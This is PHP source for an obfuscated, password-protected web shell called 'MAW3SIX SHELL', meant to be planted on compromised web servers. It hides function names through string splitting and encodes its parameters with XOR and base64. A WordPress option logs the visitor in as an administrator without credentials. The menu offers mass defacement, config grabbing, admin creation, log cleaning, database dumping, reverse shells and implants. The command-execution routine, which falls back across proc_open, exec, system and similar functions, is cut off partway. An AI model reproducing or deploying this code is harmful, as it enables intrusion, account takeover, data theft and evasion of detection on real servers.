<?php
session_start();

$hashed_password = '$2a$12$Es5rDcps21uI.E1.Ol2bBOhtwQmBbydy1ZyrkSXWGs553byZPM5m6';

function isAuthenticated() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Wrong password!";
    }
}

if (!isAuthenticated()) :
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MawLogin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}.login-card{background:linear-gradient(rgba(0,0,0,.65),rgba(0,0,0,.65)),url('https://raw.githubusercontent.com/maw3six/RC-Shell-3.0/refs/heads/main/animation-maw.webp') no-repeat center/cover,#0a0a0a61;border-radius:8px;border:1px solid #1f1f1f09;padding:40px;width:100%;max-width:400px}.login-card h2{color:#fff;margin-bottom:30px;font-weight:600;font-size:1.5rem}.login-card .form-control{background:#00000054;border:1px solid #1f1f1f00;color:#e5e5e5;border-radius:6px;padding:12px}.login-card .form-control:focus{background:#000;border-color:#404040;color:#e5e5e5;box-shadow:none}.login-card .alert-danger{background:rgba(239,68,68,.1);border:1px solid #ef4444;color:#ef4444;border-radius:6px}.btn-login{background:#fff7;border:none;color:#000;padding:12px;font-weight:600;border-radius:6px;transition:all .2s ease}.btn-login:hover{background:#d0d0d0}</style>
</head>
<body>
    <div class="login-card">
        <h2 class="text-center"><i class="fas fa-user-shield"></i> ex_Ultraman</h2>
        <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
        <form method="POST">
            <div class="mb-3">
                <input type="password" name="password" class="form-control form-control-lg" placeholder="Enter Password" required>
            </div>
            <button type="submit" class="btn btn-primary btn-login w-100">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
        </form>
    </div>
</body>
</html>
<?php
exit;
endif;

function mawXor($s) {
	$k = 'x8Kp2Lw7QjM$tR@';
	$o = '';
	for ($i = 0; $i < strlen($s); $i++) $o .= $s[$i] ^ $k[$i % strlen($k)];
	return $o;
}
function mawEn($p = array()) {
	return rtrim(strtr(base64_encode(mawXor(http_build_query($p))), '+/', '-_'), '=');
}
function mawDe($s) {
	return mawXor((string)@base64_decode(strtr((string)$s, '-_', '+/')));
}
function mkUrl($p = array()) {
	return '?d=' . mawEn($p);
}
if (isset($_GET['d']) && $_GET['d'] !== '') {
	$tmpg = array();
	@parse_str((string)mawDe($_GET['d']), $tmpg);
	if (is_array($tmpg)) $_GET = array_merge($_GET, $tmpg);
	unset($_GET['d']);
}
if (isset($_POST['d']) && $_POST['d'] !== '') {
	$tmpp = array();
	@parse_str((string)mawDe($_POST['d']), $tmpp);
	if (is_array($tmpp)) $_POST = array_merge($_POST, $tmpp);
	unset($_POST['d']);
}

if (isset($_GET['opsi']) && $_GET['opsi'] == "wpdash" && isset($_GET['loknya'])) {
	if (!function_exists('find_root_dir')) {
		function find_root_dir($current_dir) {
			while (!file_exists($current_dir . '/wp-load.php')) {
				$parent_dir = dirname($current_dir);
				if ($current_dir === $parent_dir) {
					return false;
				}
				$current_dir = $parent_dir;
			}
			return $current_dir;
		}
	}
	$mr = find_root_dir($_GET['loknya']);
	if ($mr) {
		@chdir($mr);
		if (file_exists('wp-load.php')) {
			include 'wp-load.php';
			$wp_user_query = new WP_User_Query(array('role' => 'Administrator', 'number' => 1, 'fields' => 'ID'));
			$results = $wp_user_query->get_results();
			if (isset($results[0])) {
				wp_set_auth_cookie($results[0]);
				wp_redirect(admin_url());
				exit;
			}
			die('NO ADMIN');
		}
		die('FAILED LOAD');
	}
	die('NOT WP ROOT');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
<?php echo "<title>M"."A"."W SH"."EL"."L</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/5968/5968909.png" type="image/x-icon">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');:root{--primary-color:#fff;--secondary-color:#a0a0a0;--accent-color:#707070;--bg-black:#000;--card-bg:#0a0a0a61;--text-light:#e5e5e5;--text-muted:#808080;--border-color:#1f1f1f;--success-color:#22c55e;--danger-color:#ef4444;--warning-color:#f59e0b}body{background:var(--bg-black);font-family:'Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--text-light);letter-spacing:-.02em;margin:0;overflow:hidden}.app-layout{display:flex;height:100vh}.sidebar{width:240px;min-width:240px;background:var(--card-bg);border-right:1px solid var(--border-color);display:flex;flex-direction:column;height:100vh;overflow-y:auto}.sidebar-brand{padding:24px 20px 20px;border-bottom:1px solid var(--border-color);font-size:1.2rem;font-weight:700;color:var(--primary-color);letter-spacing:-.03em}.sidebar-nav{flex:1;padding:12px 0;overflow-y:auto;background:linear-gradient(rgba(0,0,0,.75),rgba(0,0,0,.75)),var(--card-bg) url('https://raw.githubusercontent.com/maw3six/RC-Shell-3.0/refs/heads/main/animation-maw.webp') repeat center/contain}.sidebar-nav a{display:flex;align-items:center;gap:10px;padding:10px 20px;color:var(--secondary-color);text-decoration:none;font-size:.85rem;font-weight:500;transition:all .15s ease;border-left:3px solid transparent}.sidebar-nav a:hover{color:var(--primary-color);background:rgba(255,255,255,.03);border-left-color:var(--primary-color)}.sidebar-nav a i{width:18px;text-align:center;font-size:.85rem}.sidebar-footer{padding:14px 20px;border-top:1px solid var(--border-color);font-size:.75rem;color:var(--text-muted)}.main-content{flex:1;overflow-y:auto;padding:24px 32px;height:100vh}@media(max-width:768px){.sidebar{width:200px;min-width:200px}.main-content{padding:16px}}@media(max-width:576px){.app-layout{flex-direction:column}.sidebar{width:100%;min-width:100%;height:auto;max-height:40vh}.main-content{height:60vh}}.info-card{background:var(--card-bg);border-radius:8px;padding:20px;margin-bottom:20px;border:1px solid var(--border-color);transition:all .2s ease}.info-card:hover{border-color:var(--accent-color)}.info-card h5{color:var(--primary-color);font-weight:600;margin-bottom:15px;font-size:.95rem}.system-info{background:linear-gradient(rgba(0,0,0,.5),rgba(0,0,0,.5)),var(--card-bg) url('https://raw.githubusercontent.com/maw3six/RC-Shell-3.0/refs/heads/main/animation-maw.webp') repeat center/contain;border-radius:8px;padding:20px;margin-bottom:20px;border:1px solid var(--border-color);font-size:.9rem;line-height:1.8}.badge-custom{background:var(--card-bg);color:var(--primary-color);padding:4px 10px;border-radius:4px;font-weight:500;font-size:.75rem;border:1px solid var(--border-color)}.breadcrumb-custom{background:var(--card-bg);padding:12px 16px;border-radius:6px;margin-bottom:20px;border:1px solid var(--border-color)}.breadcrumb-custom a{color:var(--secondary-color);text-decoration:none;font-weight:400;transition:color .2s ease}.breadcrumb-custom a:hover{color:var(--primary-color)}.form-control{border:1px solid var(--border-color);border-radius:6px;padding:10px 14px;transition:all .2s ease;background:var(--bg-black);color:var(--text-light);font-family:'Space Grotesk',sans-serif;font-size:.9rem}.form-control:focus{border-color:var(--accent-color);background:var(--card-bg);color:var(--text-light);outline:none}.btn-primary-custom{background:var(--primary-color);border:none;color:var(--bg-black);padding:10px 20px;border-radius:6px;font-weight:600;transition:all .2s ease;font-size:.9rem;cursor:pointer}.btn-primary-custom:hover{background:var(--secondary-color)}.alert-success-custom{background:var(--card-bg);border-left:3px solid var(--success-color);border-right:1px solid var(--border-color);border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);color:var(--success-color);padding:12px 16px;border-radius:6px;margin-bottom:15px;text-align:center;font-weight:400}.alert-danger-custom{background:var(--card-bg);border-left:3px solid var(--danger-color);border-right:1px solid var(--border-color);border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);color:var(--danger-color);padding:12px 16px;border-radius:6px;margin-bottom:15px;text-align:center;font-weight:400}.alert-warning-custom{background:var(--card-bg);border-left:3px solid var(--warning-color);border-right:1px solid var(--border-color);border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);color:var(--warning-color);padding:12px 16px;border-radius:6px;margin-bottom:15px;text-align:center;font-weight:400}.table{background:var(--bg-black)!important;border-radius:8px;overflow:hidden;border:1px solid var(--border-color)}.table-bordered{border:1px solid var(--border-color)!important}.table-bordered td,.table-bordered th{border:1px solid var(--border-color)!important;background:var(--bg-black)!important}.table thead th{background:var(--card-bg)!important;color:var(--primary-color)!important;font-weight:600;border-bottom:2px solid var(--border-color);padding:14px;font-size:.85rem}.table tbody tr{border-bottom:1px solid var(--border-color);transition:background .2s ease;background:var(--bg-black)!important}.table tbody tr:hover{background:var(--card-bg)!important}.table tbody td{padding:12px;color:var(--text-light)!important;font-size:.9rem;background:var(--bg-black)!important}.table tbody td a{color:var(--secondary-color)!important;text-decoration:none;font-weight:400;transition:color .2s ease}.table tbody td a:hover{color:var(--primary-color)!important}.table .text-center{color:var(--text-light)!important}.table .text-success{color:var(--success-color)!important}.table .text-danger{color:var(--danger-color)!important}.footer-text{color:var(--text-muted);margin-bottom:5px;font-size:.85rem}.footer-link{color:var(--secondary-color);text-decoration:none;font-weight:500;transition:color .2s ease}.footer-link:hover{color:var(--primary-color)}.text-gold{color:#d4af37;font-weight:500}.text-success{color:var(--success-color);font-weight:500}.text-danger{color:var(--danger-color);font-weight:500}pre{background:var(--bg-black);border:1px solid var(--border-color);border-radius:6px;padding:16px;overflow-x:auto;color:var(--text-light);font-family:'JetBrains Mono','Monaco','Courier New',monospace;font-size:.85rem;letter-spacing:-.01em}.btn-action{background:transparent;border:1px solid var(--border-color);color:var(--secondary-color);padding:6px 10px;border-radius:4px;transition:all .2s ease;font-size:.8rem}.btn-action:hover{background:var(--card-bg);border-color:var(--accent-color);color:var(--primary-color)}.btn-action i{font-size:.85rem}.badge{padding:4px 8px;border-radius:4px;font-weight:500;font-size:.7rem}.bg-success{background:rgba(34,197,94,.1)!important;color:var(--success-color)!important;border:1px solid rgba(34,197,94,.3)}.bg-danger{background:rgba(239,68,68,.1)!important;color:var(--danger-color)!important;border:1px solid rgba(239,68,68,.3)}pre::-webkit-scrollbar{height:8px}pre::-webkit-scrollbar-track{background:#0a0a0a61}pre::-webkit-scrollbar-thumb{background:var(--primary-color);border-radius:4px}pre::-webkit-scrollbar-thumb:hover{background:var(--secondary-color)}</style>
<style>/* ===== MAW Pro overrides: neat & professional, all menus ===== */
::selection{background:rgba(212,175,55,.28);color:#fff}
.main-content :focus-visible{outline:2px solid rgba(212,175,55,.55);outline-offset:2px}
/* menu section titles */
.main-content h5{display:inline-block;background:var(--card-bg);border:1px solid var(--border-color);border-left:3px solid #d4af37;border-radius:6px;padding:10px 18px;margin:6px auto 18px;font-size:.92rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase}
.main-content h5 i{color:#d4af37;margin-right:8px}
/* legacy centering + custom color tags */
.main-content center{display:block;margin-left:auto;margin-right:auto}
gold{color:#d4af37;font-weight:500}
merah{color:var(--danger-color);font-weight:500}
ijo{color:var(--success-color);font-weight:500}
font[color='green'],font[color="green"]{color:var(--success-color)!important}
font[color='red'],font[color="red"]{color:var(--danger-color)!important}
/* ===== .up controls (used by every menu form) ===== */
input.up,select.up,textarea.up{background:#050505;border:1px solid var(--border-color);border-radius:6px;color:var(--text-light);font-family:'Space Grotesk',sans-serif;font-size:.86rem;padding:9px 12px;margin:4px 2px;transition:border-color .15s ease,box-shadow .15s ease;vertical-align:middle}
input.up:focus,select.up:focus,textarea.up:focus{border-color:#d4af37;box-shadow:0 0 0 3px rgba(212,175,55,.14);outline:none;background:#0a0a0a61}
input.up[type="text"]{min-width:220px}
input.up[size]{min-width:0}
select.up{cursor:pointer;appearance:auto}
select.up option{background:#0a0a0a61;color:var(--text-light)}
textarea.up{font-family:'JetBrains Mono',monospace;font-size:.82rem;line-height:1.6;width:100%;max-width:880px;min-height:280px;resize:vertical;display:block;margin:10px auto}
input.up[type="submit"],input.up[type="button"]{background:#e5e5e5;border:1px solid #e5e5e5;color:#000;font-weight:600;padding:9px 22px;border-radius:6px;cursor:pointer;letter-spacing:.02em}
input.up[type="submit"]:hover,input.up[type="button"]:hover{background:#fff;border-color:#fff;transform:translateY(-1px)}
input.up[type="file"]{border-style:dashed;cursor:pointer;color:var(--secondary-color);max-width:100%}
input.up[type="checkbox"],input.up[type="radio"],input[type="checkbox"].up,input[type="radio"].up{accent-color:#d4af37;width:15px;height:15px;margin:0 4px;vertical-align:-2px}
.main-content form{margin-bottom:6px}
/* breadcrumb */
.breadcrumb-custom{display:flex;align-items:center;flex-wrap:wrap;gap:6px 10px;font-size:.86rem}
.breadcrumb-custom strong{margin-right:2px}
.breadcrumb-custom a{background:rgba(255,255,255,.03);border:1px solid var(--border-color);border-radius:4px;padding:2px 9px;font-family:'JetBrains Mono',monospace;font-size:.8rem}
.breadcrumb-custom a:hover{border-color:#d4af37;color:#d4af37!important}
/* tables */
.table-responsive{border-radius:8px}
.table-responsive::-webkit-scrollbar{height:8px;width:8px}
.table-responsive::-webkit-scrollbar-track{background:#0a0a0a61}
.table-responsive::-webkit-scrollbar-thumb{background:#2a2a2a;border-radius:4px}
.table thead th{position:sticky;top:0;z-index:2;white-space:nowrap;font-size:.78rem;letter-spacing:.06em;text-transform:uppercase;color:var(--secondary-color)!important}
.table tbody td{vertical-align:middle}
.table input[type="checkbox"]{accent-color:#d4af37;width:15px;height:15px;cursor:pointer}
/* action buttons in tables */
.btn-action{min-width:30px;min-height:30px;display:inline-flex;align-items:center;justify-content:center}
.btn-action:hover{transform:translateY(-1px);border-color:#d4af37;color:#d4af37!important}
/* result / code blocks */
pre{max-height:520px;overflow:auto;line-height:1.65;white-space:pre-wrap;word-break:break-word;text-align:left}
.main-content > pre,center + pre{margin:12px auto;max-width:1100px}
/* alerts: softer tinted panels */
.alert-success-custom{background:rgba(34,197,94,.07);color:var(--success-color)}
.alert-danger-custom{background:rgba(239,68,68,.07);color:var(--danger-color)}
.alert-warning-custom{background:rgba(245,158,11,.07);color:var(--warning-color)}
.alert-success-custom i,.alert-danger-custom i,.alert-warning-custom i{margin-right:8px}
/* info cards & system panel */
.info-card h5 i{color:#d4af37;margin-right:8px}
.system-info{background-blend-mode:overlay}
/* sidebar polish */
.sidebar-brand i{color:#d4af37;margin-right:8px}
.sidebar-nav{padding:14px 0}
.sidebar-nav a{border-radius:0 6px 6px 0;margin-right:10px}
.sidebar-footer{text-align:center}
/* main scrollbars */
.main-content::-webkit-scrollbar,.sidebar::-webkit-scrollbar{width:9px}
.main-content::-webkit-scrollbar-track,.sidebar::-webkit-scrollbar-track{background:#000}
.main-content::-webkit-scrollbar-thumb,.sidebar::-webkit-scrollbar-thumb{background:#262626;border-radius:5px;border:2px solid #000}
.main-content::-webkit-scrollbar-thumb:hover,.sidebar::-webkit-scrollbar-thumb:hover{background:#3a3a3a}
/* small helper text */
.main-content p{margin:10px 0}
/* responsive */
@media(max-width:768px){
input.up[type="text"]{min-width:0;width:100%;max-width:100%}
textarea.up{max-width:100%}
.table thead th{padding:10px 8px}
.table tbody td{padding:9px 8px;font-size:.82rem}
}
@media(max-width:576px){
.main-content h5{font-size:.82rem;padding:8px 12px}
input.up[type="submit"]{width:100%;margin-top:8px}
pre{font-size:.76rem;padding:12px}
}</style>
</head>
<body>
<div class="app-layout">
<?php
$gcw = "ge"."tc"."wd";
$srl = "st"."r_r"."ep"."la"."ce";
if(isset($_GET['loknya'])){
	$lokasi = $_GET['loknya'];
	$lokdua = $_GET['loknya'];
} else {
	$lokasi = $gcw();
	$lokdua = $gcw();
}
$lokasi = $srl('\\','/',$lokasi);
$sn = $_SERVER['SC'.'RIP'.'T_N'.'AME'];
echo '<aside class="sidebar">';
echo '<div class="sidebar-brand"><i class="fas fa-terminal"></i> MA'.'W'.'3'.'SIX SH'.'EL'.'L</div>';
echo '<nav class="sidebar-nav">';
echo '<a href="'.$sn.'"><i class="fas fa-home"></i> HO'.'ME</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'recent')).'"><i class="fas fa-history"></i> RE'.'CENT FI'.'LES</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'bndr')).'"><i class="fas fa-globe"></i> OPEN BA'.'SE'.'DIR</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'proc')).'"><i class="fas fa-microchip"></i> PRO'.'CESS</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'bekup')).'"><i class="fas fa-save"></i> BA'.'CKUP SH'.'ELL</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'lompat')).'"><i class="fas fa-rocket"></i> JU'.'MP'.'ING</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'mdf')).'"><i class="fas fa-fire"></i> MA'.'SS DE'.'FA'.'CE</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem')).'"><i class="fas fa-link"></i> SY'.'ML'.'INK</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'cpanel')).'"><i class="fas fa-server"></i> CP'.'AN'.'EL UA'.'PI</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'gsocket')).'"><i class="fas fa-plug"></i> GS'.'OC'.'KET</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'adminer')).'"><i class="fas fa-database"></i> AD'.'MI'.'NER</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'cron')).'"><i class="fas fa-clock"></i> CR'.'ON JOB</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'config')).'"><i class="fas fa-search"></i> CO'.'NFI'.'G GR'.'AB</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'wpdash')).'"><i class="fab fa-wordpress"></i> WP DA'.'SHBO'.'ARD</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'wpcreate')).'"><i class="fas fa-user-plus"></i> WP CR'.'EA'.'TE AD'.'MIN</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'scanner')).'"><i class="fas fa-shield-halved"></i> SC'.'AN'.'NER</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'autoloop')).'"><i class="fas fa-infinity"></i> AU'.'TO LO'.'OP</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'search')).'"><i class="fas fa-search"></i> FI'.'LE SEARCH</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'logclean')).'"><i class="fas fa-broom"></i> LO'.'G CLEAN'.'ER</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'dbdump')).'"><i class="fas fa-database"></i> DB DU'.'MPER</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'netrecon')).'"><i class="fas fa-network-wired"></i> NE'.'TWORK RE'.'CON</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'revshell')).'"><i class="fas fa-terminal"></i> REVS'.'HELL GE'.'N</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'implant')).'"><i class="fas fa-syringe"></i> IM'.'PLANT</a>';
echo '</nav>';
echo '<div class="sidebar-footer"><div class="footer-text">Maw</div><a href="https://t.'.'me'.'/'.'maw'.'3'.'six" target="_blank" class="footer-link">MA'.'W'.'3'.'SIX</a></div>';
echo '</aside>';
echo '<main class="main-content">';
echo '<div class="system-info">';
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";
$pma = "pr"."eg_ma"."tch_"."al"."l";
$aru = "ar"."ray_un"."ique";
$ctn = "co"."unt";
$urd = "ur"."ldeco"."de";
$pgw = "pos"."ix_g"."etp"."wui"."d";
$fow = "fi"."leow"."ner";
$tch = "to"."uch";
$h2b = "he"."x2"."bin";
$hsc = "ht"."mlspe"."cialcha"."rs";
$ftm = "fi"."lemti"."me";
$ars = "ar"."ra"."y_sl"."ice";
$arr = "ar"."ray_"."ra"."nd";
$fgr = "fi"."legr"."oup";
$mdr = "mkd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
	$disf = '<span class="badge bg-success">NONE</span>';
} else {
	$disf = '<span class="badge bg-danger">'.$disfunc.'</span>';
}

function author() {
	echo '<footer class="text-center mt-5 mb-3">
		<div class="footer-text">Maw</div>
		<div><a href="https://t.'.'me'.'/'.'maw'.'3'.'six" target="_blank" class="footer-link">M'.'A'.'W'.'3'.'SIX</a></div>
	</footer>';
	exit();
}

function cdrd() {
	if (isset($_GET['loknya'])) {
		$lokasi = $_GET['loknya'];
	} else {
		$lokasi = "ge"."t"."cw"."d";
		$lokasi = $lokasi();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($lokasi)) {
		return "<font color='green'>Wr"."itea"."ble</font>";
	} else {
		return "<font color='red'>Wr"."itea"."ble</font>";
	}
}

function crt() {
	$a = "is"."_w"."ri"."tab"."le";
	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
		return "<font color='green'>Wr"."itea"."ble</font>";
	} else {
		return "<font color='red'>Wr"."itea"."ble</font>";
	}
}

function xrd($lokena) {
	$a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $b = "is"."_di"."r";
        $loknya = $lokena.'/'.$item;
        if ($b($loknya)) {
            xrd($loknya);
        } else {
        	$c = "u"."nl"."in"."k";
            $c($loknya);
        }
    }
    $d = "rm"."di"."r";
    $d($lokena);
}

function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), PATHINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fas fa-file-zipper" style="color: #808080"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fas fa-file-image" style="color: #808080"></i>';
	} elseif ($c == "txt") {
		return '<i class="fas fa-file-lines" style="color: #808080"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fas fa-file-pdf" style="color: #808080"></i>';
	} elseif ($c == "html") {
		return '<i class="fas fa-file-code" style="color: #808080"></i>';
	}
	else {
		return '<i class="fas fa-file" style="color: #808080"></i>';
	}
}

function ipsrv() {
	$a = "g"."eth"."ost"."byna"."me";
	$b = "fun"."cti"."on_"."exis"."ts";
	$c = "S"."ERVE"."R_AD"."DR";
	$d = "SE"."RV"."ER_N"."AM"."E";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}

function ggr($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."si"."x_ge"."tgr"."gid";
	$c = "fi"."le"."gro"."up";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."s"."ix_"."get"."pwu"."id";
	$c = "fi"."le"."o"."wn"."er";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function fdt($fl) {
	$a = "da"."te";
	$b = "fil"."emt"."ime";
    return $a("F d Y H:i:s", $b($fl));
}

function dunlut($fl) {
	$a = "fil"."e_exi"."sts";
	$b = "ba"."sena"."me";
	$c = "fi"."les"."ize";
	$d = "re"."ad"."fi"."le";
	if ($a($fl) && isset($fl)) {
		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
		header("Conte'.'nt-Control:public");
		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
		header('Exp'.'ires: 0');
		header("Ex"."pired:0");
		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
		header('Pra'.'gma: pub'.'lic');
		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "Fi"."le Not F"."ound !";
	}
}

function mawCmd($cmd, $lk = null) {
	if ($lk === null) $lk = getcwd();
	$cmd = $cmd . " 2>&1";
	$fe = "fu"."ncti"."on_ex"."ists";
	$out = false;
	if ($fe("p"."ro"."c_o"."pe"."n")) {
		$desc = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
		$fn = "p"."ro"."c_o"."pe"."n";
		$proc = @$fn($cmd, $desc, $pipes, $lk);
		if (is_resource($proc)) {
			$sgc = "st"."rea"."m_g"."et_c"."onte"."nts";
			$out = @$sgc($pipes[1]);
			@fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
			$pcl = "p"."ro"."c_cl"."ose";
			@$pcl($proc);
			if ($out !== "" && $out !== false) return $out;
		}
	}
	if ($fe("ex"."ec")) {
		$buf = array();
		$fn = "ex"."ec";
		@$fn($cmd, $buf, $rc);
		$imp = "im"."plo"."de";
		$out = @$imp("\n", $buf);
		if ($out !== "" && $out !== false) return $out;
	}
	if ($fe("sh"."ell_ex"."ec")) {
		$fn = "sh"."ell_ex"."ec";
		$out = @$fn($cmd);
		if ($out !== null && $out !== "") return $out;
	}
	if ($fe("sy"."stem")) {
		ob_start();
		$fn = "sy"."stem";
		@$fn($cmd);
		$out = ob_get_clean();
		if ($out !== "" && $out !== false) return $out;
	}
	if ($fe("pa"."sth"."ru")) {
		ob_start();
		$fn = "pa"."sth"."ru";
		@$fn($cmd);
		$out = ob_get_clean();
		if ($out !== "" && $out !== false) return $out;
	}
	if ($fe("po"."pen")) {
		$fn = "po"."pen";
		$fp = @$fn($cmd, "r");
		if (is_resource($fp)) {
			$sgc = "st"."rea"."m_g"."et_c"."onte"."nts";
			$out = @$sgc($fp);
			$pcl = "pc"."lo"."se";
			@$pcl($fp);
			if ($out !== "" && $out !== false) return $out;
		}
	}
	$isWin = stripos(PHP_OS, "WI") !== false;
	if (!$isWin) {
		$tmpDir = sys_get_temp_dir();
		$script = $tmpDir . "/.maw_" . substr(md5(uniqid()), 0, 6);
		@file_put_contents($script, "#!/bin/sh\n" . $cmd . "\n");
		@chmod($script, 0755);
		if ($fe("cu"."rl_in"."it")) {
			$ci = "cu"."rl_in"."it";
			$ch = @$ci("file://" . $script);
			if ($ch) {
				@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				@curl_setopt($ch, CURLOPT_TIMEOUT, 5);
				$ce = "cu"."rl_e"."xec";
				$r = @$ce($ch);
				@curl_close($ch);
				if ($r && $r !== "") { @unlink($script); return $r; }
			}
		}
